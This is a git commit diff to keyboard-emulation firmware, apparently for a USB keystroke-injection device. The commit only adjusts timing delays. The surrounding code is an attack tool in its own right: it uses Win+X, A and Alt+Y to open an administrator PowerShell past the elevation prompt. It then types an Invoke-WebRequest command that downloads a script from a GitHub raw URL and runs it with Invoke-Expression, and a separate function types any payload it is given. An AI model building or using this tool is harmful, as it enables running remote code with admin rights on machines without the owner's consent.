91692809891e4ca2487ec4ad8daf772bdca6f049
xzrd <fox.inta@proton.me>
2025-06-22 16:45:57 +1200

    Fine tuning adjustments

--- lib/key/key.cpp
+++ lib/key/key.cpp
@@ -11,36 +11,34 @@ void KEYBOARD::up() {
 void KEYBOARD::openPS() {
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('x');
-    delay(10);
+    delay(25);
     Keyboard.releaseAll();
-    delay(250);
+    delay(500);
     Keyboard.press('a');
     delay(50);
     Keyboard.release('a');
-    delay(300);
+    delay(750);
     Keyboard.press(KEY_LEFT_ALT);
-    delay(10);
+    delay(25);
     Keyboard.press('y');
     delay(150);
     Keyboard.releaseAll();
+    delay(750);
 }
 
 void KEYBOARD::pullScript() {
     KEYBOARD::openPS();
-    delay(500);
     Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
     Serial1.println("#Roger Roger#");
 }
 void KEYBOARD::pullScriptExit() {
     KEYBOARD::openPS();
-    delay(500);
     Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content); exit");
     Serial1.println("#Roger Roger#");
 }
 
 void KEYBOARD::runPayload(String payload) {
     KEYBOARD::openPS();
-    delay(500);
     Keyboard.println(payload);
     Serial1.println("#Roger Roger#");
 }
